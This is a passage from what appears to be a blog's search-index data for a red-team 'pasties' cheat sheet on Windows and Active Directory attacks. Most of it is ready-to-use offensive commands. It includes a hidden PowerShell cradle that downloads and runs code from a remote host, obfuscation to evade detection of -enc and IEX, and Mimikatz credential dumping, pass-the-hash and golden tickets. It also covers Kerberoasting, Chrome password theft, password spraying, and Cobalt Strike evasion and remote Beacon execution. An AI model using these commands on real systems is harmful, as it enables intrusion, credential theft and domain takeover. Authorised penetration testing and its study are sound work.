https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C ,ADMIN ,ADMIN ) 1 Get-ItemProperty HKLM:SOFTWAREMicrosoftWindowsCurrentVersionPoliciesSystem |Select LocalAccountTokenFilterPolicy |fl Test User Credentials 1 powerpick $password = ConvertTo-SecureString \"PlainTextPassword\" -AsPlainText -Force;$cred= New-Object System.Management.Automation.PSCredential (\"domainname\", $password); Search for SSN https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx 1 $SSN_Regex = \" [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}\" ; Get-ChildItem . -Recurse -exclude *.exe,*.dll| Select-String -Pattern $SSN_Regex | Select-String -Pattern $SSN_Regex| Select-Object Path,Filename,Matches |ft -auto|out-string -width 200; \"[*] SSN Search Complete!\" Enumerate the use of the Windows Server Update Services (WSUS) 1 2 3 4 5 6 7 Get-ItemProperty -Path Registry::\"HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdate\" |Select-Object -ExpandProperty WUServer Get-ItemProperty -Path Registry::\"HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdate\" |Select-Object -ExpandProperty WUStatusServer Get-ItemProperty -Path Registry::\"HKLMSOFTWAREPoliciesMicrosoftWindowsWindowsUpdateAU\" |Select-Object -ExpandProperty UseWUServer reg query HKEY_LOCAL_MACHINESOFTWAREPoliciesMicrosoftWindowsWindowsUpdate Get unquoted service paths 1 gwmi win32_service |Select pathname | Where {($_.pathname -ne $null)} | Where {-not $_.pathname.StartsWith(\"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\".\") +4)) -match \".* .*\"}","title":"Powershell"},{"location":"blogs/2019/01/penetration-testing-pasties/#find-files-custom","text":"1 Find-Files -searchBase \"i:\" -searchTerms \"*web.xml*,*web.config*,*password*,*tomcat-users.xml*\" -LogPath \"C:UsersusernameAppDataLocalTemp\"","title":"Find-Files (custom)"},{"location":"blogs/2019/01/penetration-testing-pasties/#get-enumeration-custom","text":"Run Local and Domain enumeration functions on the local host. 1 Get-Enumeration -Path . -Local -Domain","title":"Get-Enumeration (custom)"},{"location":"blogs/2019/01/penetration-testing-pasties/#download-and-execute-iex","text":"1 powershell -nop -w hidden -c \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\"","title":"Download and execute IEX"},{"location":"blogs/2019/01/penetration-testing-pasties/#encodedcommand-and-iex-detection-bypass","text":"Author: Dave Kennedy Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/ Avoid detection of -enc 1 powershell -window hidden -C \"set-variable -name \"C\" -value \"-\"; set-variable -name \"s\" -value \"e\"; set-variable -name \"q\" -value \"c\"; set-variable -name \"P\" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() \" Avoid detection of IEX 1 powershell -window hidden -C \"set-variable -name \"LB\" -value \"I\"; set-variable -name \"I\" -value \"E\"; set-variable -name \"V\" -value \"X\"; set-variable -name \"wP\" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('')\"","title":"EncodedCommand and IEX detection bypass"},{"location":"blogs/2019/01/penetration-testing-pasties/#bloodhound","text":"1 2 3 iex (( new-object system . net . webclient ) . downloadstring ( 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1' )); Invoke-Bloodhound -CSVFolder c : temp -CSVPrefix Invoke-BloodHound -DomainController -Domain -CSVFolder C : userspubliclibraries -CSVPrefix -CollectionMethod Stealth","title":"Bloodhound"},{"location":"blogs/2019/01/penetration-testing-pasties/#mimikittenz","text":"https://github.com/putterpanda/mimikittenz mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes. mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to: TRACK2 (CreditCard) data from merchant/POS processes PII data Encryption Keys & All the other goodstuff Execution 1 Invoke-Mimikittenz Customizations 1 2 3 4 5 Custom regex - The syntax for adding custom regex is as follows: [mimikittenz.MemProcInspector]::AddRegex(\"\",\"\") Custom target process - Just append your target proccess name into the array: [mimikittenz.MemProcInspector]::InspectManyProcs(\"iexplore\",\"chrome\",\"firefox\")","title":"Mimikittenz"},{"location":"blogs/2019/01/penetration-testing-pasties/#powerup","text":"Performs multiple local host privilege escalation checks for common Windows misconfigurations. 1 Invoke-AllChecks See cheat sheet for more commands","title":"PowerUp"},{"location":"blogs/2019/01/penetration-testing-pasties/#powerview","text":"Requires domain user privileges Find Administrative users logged in across the domain \u2013 default group = Domain Admins) 1 2 Invoke-UserHunter -Threads 15 -NoPing [-GroupName \"Enterprise Admins\"] Invoke-UserHunter -Threads 20 -GroupName \"Domain Admins\" -SearchForest -CheckAccess Find User (Stealthy via Fileshares) 1 Invoke-UserHunter -Stealth -Threads 5 -NoPing [-GroupName \"Enterprise Admins\"] [-UserName \"svcAccount\"] Get domain user info 1 2 3 Get-NetUser [-UserName john] Get-NetUser -Domain | Select-Object objectsid,lockouttime,samaccounttype,accountexpires,objectclass,useraccountcontrol,@{Name='memberof';Expression={[string]::join(\";\",($_.memberof))}},info,distinguishedname,adspath,cn,pwdlastset,objectguid,whencreated,description,samaccountname,usnchanged,name| export-csv userprops_members.csv Find group names 1 Get-NetGroup [-GroupName *admin*] Get group members 1 Get-NetGroupMember [-GroupName \"Domain Admins\"] Find open shares \u2013 Noisy 1 Invoke-ShareFinder -CheckShareAccess Find open (non-default i.e. C$) shares by LDAP source 1 2 3 Invoke-ShareFinder -ComputerADSPath \"LDAP://OU=Servers,OU=IT,DC=domain,DC=com\" -CheckShareAccess -ExcludeStandard | Out-File -Encoding ascii c:windowstempserver_shares.txt Invoke-ShareFinder -ExcludePrint -ExcludeIPC -CheckShareAccess Find interesting files 1 powershell Invoke-FileFinder -ComputerName -share share_list.txt -terms ssn,pass,sensitive,secret,admin,login,unattend*.xml,web.config,account -Threads 20 | export-csv filefinder_shares.csv Find hosts where the current user is local admin \u2013 Noisy 1 Find-LocalAdminAccess Get details of all domain computers and export to a CSV file for easy viewing 1 Get-computerproperty -Domain -properties displayname,adspath,lastlogontimestamp,operatingsystem,operatingsystemversion,@{Name='memberof';Expression={[string]::join(\";\",($_.memberof))}}|export-csv computerprops.csv Get Computers with Unconstrained Delegation 1 Get-NetComputer -Unconstrained |ft -a Get Users & Computers Trusted for Delegation 1 2 3 Get-DomainUser -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl Get-DomainComputer -TrustedtoAuth -Properties distinguisedname,useraccountcontrol,msds-allowedtodelegateto|fl","title":"PowerView"},{"location":"blogs/2019/01/penetration-testing-pasties/#net-functions","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 Get-NetDomain - gets the name of the current user's domain Get-NetForest - gets the forest associated with the current user's domain Get-NetForestDomain - gets all domains for the current forest Get-NetDomainController - gets the domain controllers for the current computer's domain Get-NetUser - returns all user objects, or the user specified (wildcard specifiable) Add-NetUser - adds a local or domain user Get-NetComputer - gets a list of all current servers in the domain Get-NetPrinter - gets an array of all current computers objects in a domain Get-NetOU - gets data for domain organization units Get-NetSite - gets current sites in a domain Get-NetSubnet - gets registered subnets for a domain Get-NetGroup - gets a list of all current groups in a domain Get-NetGroupMember - gets a list of all current users in a specified domain group Get-NetLocalGroup - gets the members of a localgroup on a remote host or hosts Add-NetGroupUser - adds a local or domain user to a local or domain group Get-NetFileServer - get a list of file servers used by current domain users Get-DFSshare - gets a list of all distribute file system shares on a domain Get-NetShare - gets share information for a specified server Get-NetLoggedon - gets users actively logged onto a specified server Get-NetSession - gets active sessions on a specified server Get-NetRDPSession - gets active RDP sessions for a specified server (like qwinsta) Get-NetProcess - gets the remote processes and owners on a remote server Get-UserEvent - returns logon or TGT events from the event log for a specified host Get-ADObject - takes a domain SID and returns the user, group, or computer object associated with it Set-ADObject - takes a SID, name, or SamAccountName to query for a specified domain object, and then sets a specified 'PropertyName' to a specified 'PropertyValue'","title":"net * Functions:"},{"location":"blogs/2019/01/penetration-testing-pasties/#gpo-functions","text":"1 2 3 4 5 6 7 8 9 Get-GptTmpl - parses a GptTmpl.inf to a custom object Get-NetGPO - gets all current GPOs for a given domain Get-NetGPOGroup - gets all GPOs in a domain that set \"Restricted Groups\" on on target machines Find-GPOLocation - takes a user/group and makes machines they have effective rights over through GPO enumeration and correlation Find-GPOComputerAdmin - takes a computer and determines who has admin rights over it through GPO enumeration Get-DomainPolicy - returns the default domain or DC policy","title":"GPO functions"},{"location":"blogs/2019/01/penetration-testing-pasties/#user-hunting-functions","text":"1 2 3 4 Invoke-UserHunter - finds machines on the local domain where specified users are logged into, and can optionally check if the current user has local admin access to found machines Invoke-StealthUserHunter - finds all file servers utilizes in user HomeDirectories, and checks the sessions one each file server, hunting for particular users Invoke-ProcessHunter - hunts for processes with a specific name or owned by a specific user on domain machines Invoke-UserEventHunter - hunts for user logon events in domain controller event logs","title":"User-Hunting Functions:"},{"location":"blogs/2019/01/penetration-testing-pasties/#domain-trust-functions","text":"1 2 3 4 5 Get-NetDomainTrust - gets all trusts for the current user's domain Get-NetForestTrust - gets all trusts for the forest associated with the current user's domain Find-ForeignUser - enumerates users who are in groups outside of their principal domain Find-ForeignGroup - enumerates all the members of a domain's groups and finds users that are outside of the queried domain Invoke-MapDomainTrust - try to build a relational mapping of all domain trusts","title":"Domain Trust Functions:"},{"location":"blogs/2019/01/penetration-testing-pasties/#metafunctions","text":"1 2 3 4 5 6 7 Invoke-ShareFinder - finds (non-standard) shares on hosts in the local domain Invoke-FileFinder - finds potentially sensitive files on hosts in the local domain Find-LocalAdminAccess - finds machines on the domain that the current user has local admin access to Find-UserField - searches a user field for a particular term Find-ComputerField - searches a computer field for a particular term Get-ExploitableSystem - finds systems likely vulnerable to common exploits Invoke-EnumerateLocalAdmin - enumerates members of the local Administrators groups across all machines in the domain HarmJ0y PowerView Cheat Sheet PDF HarmJ0y's PowerView 2.0 Tricks Gist","title":"MetaFunctions:"},{"location":"blogs/2019/01/penetration-testing-pasties/#inveigh","text":"https://github.com/Kevin-Robertson/Inveigh Inveigh is a Windows PowerShell LLMNR/NBNS spoofer/man-in-the-middle tool designed to assist penetration testers that find themselves limited to a Windows system. The main Inveigh LLMNR/NBNS spoofer function. Invoke-Inveigh","title":"Inveigh"},{"location":"blogs/2019/01/penetration-testing-pasties/#privilege-requirements","text":"Elevated Administrator or SYSTEM","title":"Privilege Requirements:"},{"location":"blogs/2019/01/penetration-testing-pasties/#features","text":"IPv4 LLMNR/NBNS spoofer with granular control NTLMv1/NTLMv2 challenge/response capture over HTTP/HTTPS/SMB Basic auth cleartext credential capture over HTTP/HTTPS WPAD server capable of hosting a basic or custom wpad.dat file HTTP/HTTPS server capable of hosting limited content Granular control of console and file output Run time control","title":"Features:"},{"location":"blogs/2019/01/penetration-testing-pasties/#powershell-wout-powershell","text":"MsBuild.exe https://gist.githubusercontent.com/subTee/6b236083da2fd6ddff216e434f257614/raw/a224d1edd3453cc321c63aaeefd2b59ea00622a2/pshell.xml","title":"Powershell W/out Powershell"},{"location":"blogs/2019/01/penetration-testing-pasties/#get-indexeditem","text":"Gets files which have been indexed by Windows desktop search. Searches the Windows index on the local computer or a remote file serving computer looking for file properties or free text searching over contents Sources: https://gallery.technet.microsoft.com/scriptcenter/Get-IndexedItem-PowerShell-5bca2dae https://github.com/adaptivethreat/Empire/blob/master/data/module_source/collection/Get-IndexedItem.ps1","title":"Get-IndexedItem"},{"location":"blogs/2019/01/penetration-testing-pasties/#interacting-w-windows-api","text":"https://blogs.technet.microsoft.com/heyscriptingguy/2013/06/25/use-powershell-to-interact-with-the-windows-api-part-1/","title":"Interacting w/ Windows API"},{"location":"blogs/2019/01/penetration-testing-pasties/#example-lock-workstation-and-messagebox","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 Add - Type - TypeDefinition @\" using System ; using System . Diagnostics ; using System . Runtime . InteropServices ; public static class User32 { [ DllImport ( \"user32.dll\" , CharSet = CharSet . Auto )] public static extern bool MessageBox ( IntPtr hWnd , /// Parent window handle String text , /// Text message to display String caption , /// Window caption int options ); /// MessageBox type [ DllImport ( \"user32.dll\" , CharSet = CharSet . Auto )] public static extern bool LockWorkStation (); } \"@ [ USER32 ] :: LockWorkStation () List static methods 1 [USER32] |get-member -static","title":"Example \u2013 Lock Workstation and MessageBox"},{"location":"blogs/2019/01/penetration-testing-pasties/#mailsniper-owa-and-exchange-enumeration","text":"Source: https://github.com/dafthack/MailSniper MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). It can be used as a non-administrative user to search their own email, or by an Exchange administrator to search the mailboxes of every user in a domain. MailSniper also includes additional modules for password spraying, and gathering the Global Address List from OWA and EWS. Bypassing Dual Factor Authentication on OWA \u2013 http://www.blackhillsinfosec.com/?p=5396 It appears that Outlook portals that are being protected by two-factor authentication might not be covering all of the authentication protocols to Microsoft Exchange. Leverages the Exchange Web Services (EWS) feature of OWA. Just have to check for the presence of mail.org.comEWSExchange.asmx Invoke-SelfSearch -Mailbox email@domain.com -ExchHostname mail.domain.com -Remote After the credentials have been entered MailSniper will attempt to connect to the EWS URL at https://mail.domain.com/EWS/Exchange.asmx and search the user's inbox for key terms (by default \" pass \", \" creds \", and \" credentials \").","title":"MailSniper (OWA and Exchange Enumeration)"},{"location":"blogs/2019/01/penetration-testing-pasties/#locate-owa-instances-via-autodiscover-using-only-organization-primary-domain-name","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 / Autodiscover / Autodiscover . xml or autodiscover ./ Autodiscover / Autodiscover . xml or dig _autodiscover . _tcp . SRV ; <<>> DiG 9 . 8 . 3-P1 <<>> _autodiscover . _tcp . . org SRV ;; global options : + cmd ;; Got answer : ;; - >> HEADER << - opcode : QUERY , status : NOERROR , id : 45003 ;; flags : qr rd ra ; QUERY : 1 , ANSWER : 1 , AUTHORITY : 0 , ADDITIONAL : 0 ;; QUESTION SECTION : ; _autodiscover . _tcp . . org . IN SRV ;; ANSWER SECTION : _autodiscover . _tcp . . org . 1720 IN SRV 0 0 443 webmail . . org . ;; Query time : 2 msec ;; SERVER : 192 . 168 . 178 . 1 # 53 ( 192 . 168 . 178 . 1 ) ;; WHEN : Thu Dec 1 10 : 40 : 33 2016 ;; MSG SIZE rcvd : 83","title":"Locate OWA instances via Autodiscover using only organization primary domain name"},{"location":"blogs/2019/01/penetration-testing-pasties/#domainpasswordspray-internal-windows-domain-password-brute-forcing","text":"Source: https://github.com/dafthack/DomainPasswordSpray DomainPasswordSpray is a tool written in PowerShell to perform a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. BE VERY CAREFUL NOT TO LOCKOUT ACCOUNTS!","title":"DomainPasswordSpray (Internal Windows Domain Password Brute Forcing)"},{"location":"blogs/2019/01/penetration-testing-pasties/#quick-start-guide","text":"Open a PowerShell terminal from the Windows command line with 'powershell.exe -exec bypass'. 1 Type 'Import-Module Invoke-DomainPasswordSpray.ps1'. The only option necessary to perform a password spray is either -Password for a single password or -PasswordList to attempt multiple sprays. When using the -PasswordList option Invoke-DomainPasswordSpray will attempt to gather the account lockout observation window from the domain and limit sprays to one per observation window to avoid locking out accounts. The following command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016. 1 PowerShell Invoke-DomainPasswordSpray -Password Winter2016 The following command will use the userlist at users.txt and try to authenticate to the domain \"domain-name\" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to one attempt during each window. The results of the spray will be output to a file called sprayed-creds.txt 1 PowerShell Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt","title":"Quick Start Guide"},{"location":"blogs/2019/01/penetration-testing-pasties/#invoke-domainpasswordspray-options","text":"1 2 3 4 5 UserList - Optional UserList parameter. This will be generated automatically if not specified. Password - A single password that will be used to perform the password spray. PasswordList - A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts). OutFile - A file to output the results to. Domain - A domain to spray against.","title":"Invoke-DomainPasswordSpray Options"},{"location":"blogs/2019/01/penetration-testing-pasties/#misc-powershell-pasties","text":"List Removeable Drives 1 Get-WmiObject Win32_LogicalDisk | Where-Object {($_.DriveType -eq 2) -and ($_.DeviceID -ne 'A:')} | %{\"USB_PROCESS_DETECTED: \" + $_.ProviderName + \"`n\"} Random Execution Method 1 2 3 $visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\"visio.application\", \"system1\")) $docs = $visio.Documents.Add(\"\") $docs.ExecuteLine('CreateObject(\"Wscript.Shell\").Exec(\"cmd.exe\")')","title":"Misc Powershell Pasties"},{"location":"blogs/2019/01/penetration-testing-pasties/#mimikatz","text":"https://github.com/gentilkiwi/mimikatz/wiki Attack Methods for Gaining Domain Admin Rights in Active Directory Dump Cleartext Credentials 1 2 3 sekurlsa::wdigest sekurlsa::logonpasswords lsadump::secrets Dump cached domain credentials 1 lsadump::cache Format mscachev2 as $DCC2$10240#username#hash 1 cat 'mscachecreds.txt' | awk -F \":\" {'print \"$DCC2$10240#\"$1\"#\"$2'} Crack mscachev2 format with Hashcat (extremely slow) 1 ./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule DCSYNC \u2013 Remote Hash Dumping from a Domain Controller 1 mimikatz lsadump::dcsync /user:domainkrbtgt There is also a CS built-in function for this Source: http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/ Pass the Hash 1 mimikatz sekurlsa::pth /user:localadmin /domain:. /ntlm:21306681c738c3ed2d615e29be1574a3 /run:powershell -w hidden Golden Ticket Creation (File) 1 mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /groups:501,502,513,512,520,518,519 /krbtgt: /ticket:newadmin.tkt Golden Ticket Creation (Pass-The-Ticket) \u2013 Create the ticket for your current session 1 mimikatz kerberos::golden /user:newadmin /domain:domain.com /sid:S-1-5-21-3683589091-3492174527-1688384936 /krbtgt: /ptt To create a Golden ticket to own the parent domain, once a child domain controller is compromised you will need the following pieces: 1 2 3 4 5 6 7 8 /user:ChildDomainControllerMachineName$ /rc4: KRBTGT Hash /sid:Child Domain SID /domain:FQDN of Child Domain /groups:516 /sids:ParentSID-516,S-1-5-9 /id:ID of Child Domain Controller /ptt Dump Google Chrome passwords 1 2 3 4 5 shell copy \"C:userskobrienappdatalocalgooglechromeuser datadefaultLogin Data\" C:userspubliclibrariesld.dat steal_token mimikatz @dpapi::chrome /in:C:userspubliclibrariesld.dat /unprotect Detecting Golden Ticket use on a DC","title":"Mimikatz"},{"location":"blogs/2019/01/penetration-testing-pasties/#kerberoast","text":"https://github.com/nidem/kerberoast https://room362.com/post/2016/kerberoast-pt1/ https://room362.com/post/2016/kerberoast-pt2/ https://room362.com/post/2016/kerberoast-pt3/ 1 Add-Type -AssemblyName System.IdentityModel; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList \"MSSQLSvc/host.domain.com\" Use mimikatz to export SPN Tikets once requested (Generates one file per ticket unless base64 option is used) 1 2 mimkatz kerberos::list /export Invoke-Mimikatz -Command 'standard::base64 \"kerberos::list /export\" exit' Impacket method of extracting SPN tickets and output hashes in the correct format for John via Proxychains and Beacon (Preferred) 1 proxychains python ./GetUserSPNs.py -request domain.com/domainuser:password -dc-ip -outputfile Cracking the hashes 1 2 3 ./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule ./john --format=krb5tgs spns.dump --wordlist=","title":"Kerberoast"},{"location":"blogs/2019/01/penetration-testing-pasties/#domain-admin-privesc-methods","text":"Attack Methods for Gaining Domain Admin Rights in Active Directory Passwords in SYSVOL & Group Policy Preferences findstr /S cpassword %logonserver%sysvol*.xml or use Get-GPPPasswords.ps1 from PowerSploit Exploit the MS14-068 Kerberos Vulnerability on a Domain Controller Missing the Patch Kerberos TGS Service Ticket Offline Cracking (Kerberoast) The Credential Theft Shuffle Gain access to AD Database file (ntds.dit) Backup locations (backup server storage, media, and/or network shares) Find the NTDS.dit file staged on member servers prior to promoting to Domain Controllers. With admin rights to virtualization host, a virtual DC can be cloned and the associated data copied offline. Simple TCP Port Redirection 1 2 socat TCP-LISTEN:80,fork TCP::80 socat TCP-LISTEN:443,fork TCP::443 UDP Port Redirection 1 socat udp4-recvfrom : 53 , reuseaddr , fork udp4-sendto :; echo -ne Simple HTTP Redirect Save as a file like the following as redirect.html and map to root \"/\" on your Team Server. Casual browsing to the root of your domain will then simply redirect.","title":"Domain Admin Privesc Methods"},{"location":"blogs/2019/01/penetration-testing-pasties/#domain-fronting","text":"https://github.com/rvrsh3ll/FindFrontableDomains","title":"Domain Fronting"},{"location":"blogs/2019/01/penetration-testing-pasties/#cobalt-strike","text":"Gettin' Down with Aggressor Script https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/DA-Watch.cna https://github.com/Und3rf10w/Aggressor-scripts 1 portscan 10.42.175.0/26 21,22,23,25,80,443,445,1433,3389,8080,8443 Start Remote Beacon DLL via iwmi 1 powerpick iwmi -class Win32_Process -name create -ArgumentList \"rundll32.exe c:userspubliclibrariessmb_beacon.dll.log0,StartW\"","title":"Cobalt Strike"},{"location":"blogs/2019/01/penetration-testing-pasties/#opsec-considerations-for-beacon-commands","text":"Blog.Cobaltstrike.com \u2013 OPSEC Considerations For Beacon Commands A good operator knows their tools and has an idea of how the tool is accomplishing its objectives on their behalf. This blog post surveys Beacons commands and provides background on which commands inject into remote processes, which commands spawn jobs, and which commands rely on cmd.exe or powershell.exe. API-only These commands are built-into Beacon and rely on Win32 APIs to meet their objectives. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 cd cp download drives exit getuid kerberos_ccache_use kerberos_ticket_purge kerberos_ticket_use jobkill kill link ls make_token mkdir mv ppid ps pwd rev2self rm rportfwd socks steal_token timestomp unlink upload House-keeping Commands The following commands are built into Beacon and exist to configure Beacon or perform house-keeping actions. Some of these commands (e.g., clear, downloads, help, mode, note) do not generate a task for Beacon to execute. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 cancel checkin clear downloads help jobs mode dns mode dns-txt mode dns6 mode http note powershell-import sleep socks stop spawnto Post-Exploitation Jobs (Process Execution + Remote Process Injection) Many Beacon post-exploitation features spawn a process and inject a capability into that process. Beacon does this for a number of reasons: (i) this protects the agent if the capability crashes, (ii) this scheme makes it seamless for an x86 Beacon to launch x64 post-exploitation tasks. The following commands run as post-exploitation jobs: 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 browserpivot bypassuac covertvpn dcsync desktop elevate hashdump keylogger logonpasswords mimikatz net portscan powerpick psinject pth screenshot shspawn spawn ssh ssh-key wdigest OPSEC Advice: Use the spawnto command to change the process Beacon will launch for its post-exploitation jobs. The default is rundll32.exe (you probably don't want that). The ppid command will change the parent process these jobs are run under as well. Process Execution These commands spawn a new process: 1 2 3 execute runas runu OPSEC Advice: The ppid command will change the parent process of commands run by execute. The ppid command does not affect runas or spawnu. Process Execution: Cmd.exe The shell command depends on cmd.exe. The pth and getsystem commands get honorable mention here. These commands rely on cmd.exe to pass a token to Beacon via a named pipe. OPSEC Advice: the shell command uses the COMSPEC environment variable to find the preferred command-line interpreter on Windows. Use Aggressor Script's &bsetenv function to point COMSPEC to a different cmd.exe location, if needed. Use the ppid command to change the parent process the command-line interpreter is run under. To pth without cmd.exe, execute the pth steps by hand. Process Execution: PowerShell.exe The following commands launch powershell.exe to perform some task on your behalf. 1 2 3 4 5 powershell spawnas spawnu winrm wmi OPSEC Advice: Use the ppid command to change the parent process powershell.exe is run under. Be aware, there are alternatives to each of these commands that do not use powershell.exe: 1 2 3 spawnu has runu which runs an arbitrary command under another process. spawnas has runas which runs an arbitrary command as another user. powershell has powerpick, this command runs powershell scripts without powershell.exe. It's also possible to laterally spread without the winrm and wmi commands. Remote Process Injection The post-exploitation job commands (previously mentioned) rely on process injection too. The other commands that inject into a remote process are: 1 2 3 dllinject inject shinject Service Creation The following internal Beacon commands create a service (either on the current host or a remote target) to run a command. These commands use Win32 APIs to create and manipulate services. 1 2 3 getsystem psexec psexec_psh","title":"OPSEC Considerations for Beacon Commands"},{"location":"blogs/2019/01/penetration-testing-pasties/#powershell-function-wrapper","text":"https://github.com/bluscreenofjeff/AggressorScripts/blob/master/powershell.cna https://bluescreenofjeff.com/2016-09-07-adding-easy-guis-to-aggressor-scripts/","title":"Powershell Function Wrapper"},{"location":"blogs/2019/01/penetration-testing-pasties/#persistence-scripts","text":"https://github.com/ZonkSec/persistence-aggressor-script https://github.com/ZonkSec/persistence-aggressor-script/blob/master/persistence.cna","title":"Persistence Scripts"},{"location":"blogs/2019/01/penetration-testing-pasties/#empire","text":"Cheat sheets 1 2 - https://github.com/adaptivethreat/Empire/wiki/Quickstart - https://attackerkb.com/Powershell/Powershell_Empire Clone GIT Repo 1 2 root@workstation:~# git clone https://github.com/adaptivethreat/Empire.git empire Cloning into 'empire'... Install Empire 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 root@workstation:~# cd empire/ root@workstation:~/empire# cd setup/ root@workstation:~/empire/setup# ./install.sh Reading package lists... Done Building dependency tree Reading state information... Done ... Successfully installed pydispatcher Cleaning up... [&gt;] Enter server negotiation password, enter for random generation: [*] Database setup completed! root@workstation:~/empire/setup# Start Empire 1 2 root@workstation:~/empire/setup# cd .. root@workstation:~/empire# ./empire Start with REST API for use with Empire Web 1 2 3 ./empire --headless --username admin --password --restport 1337 ./empire --rest --username admin --password --restport 1337","title":"EMPIRE"},{"location":"blogs/2019/01/penetration-testing-pasties/#c2-profiles","text":"Edit default client settings in /setup/setup_database.py Example Default Profile 1 \"/CWoNaJLBo/VTNeWw11212/|Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)|Accept:image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*|Accept-Language:en-en\"","title":"C2 Profiles"},{"location":"blogs/2019/01/penetration-testing-pasties/#bash","text":"BASH loop example 1 2 3 4 for u in ` cat hosts . txt ` ; do echo -n \" [ * ] user: $u\" & amp ;& amp ; proxychains python / usr / local / bin / secretsdump . py domain / username @$ u -hashes aad3b435b51404eeaad3b435b51404ee : 0e493911f561a425e7a905329f4454bf | tee user_brute . log done BASH .bashrc Function Example 1 2 3 function start_sshtunnel() { ssh - A - t - p22 - L 8800 : localhost : 8800 james @123 . 001.123 - t ssh - L 8800 : localhost : 80 james @124 . 125.123 } Quick BASH format .bash_profile (mod ipconfig > ifconfig for Linux) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # .bash_profile PATH=$PATH:/home/james/ export PATH alias ls='ls -G' alias grep='grep --color=auto' alias la='ls -AlahG' alias el='sudo $(history -p !!)' alias ll='ls -alF' alias l='ls -CF' alias lg='ls -AlahG |grep $1' alias netstati='lsof -P -i -n' export PS1=\"nn[$(if [[ $? == 0 ]]; then echo \"[$GREEN]\u2713\"; else echo \"[$RED]\u2715\"; fi)[","title":"BASH"}]}